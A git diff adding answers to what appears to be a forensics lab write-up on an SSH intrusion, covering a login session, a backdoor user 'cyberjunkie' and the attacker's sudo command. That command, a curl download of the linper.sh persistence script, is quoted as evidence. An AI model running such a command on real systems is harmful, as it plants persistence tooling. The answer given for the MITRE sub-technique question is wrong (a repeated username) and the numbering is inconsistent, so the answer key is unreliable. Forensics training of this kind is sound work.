@@ -54,4 +54,16 @@ Since 34 is the first login it open and disconnect immediately, so we got the an
 >
 ![image](./images/Session.png)
 > ANS: `37`
-6. 
+>
+5.  The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?
+>
+> ANS: `cyberjunkie`
+>
+6.  What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?
+>
+> ANS: `cyberjunkie`
+>
+7.  What time did the attacker's first SSH session end according to auth.log?
+8.  The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?
+>
+> Ans: `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`
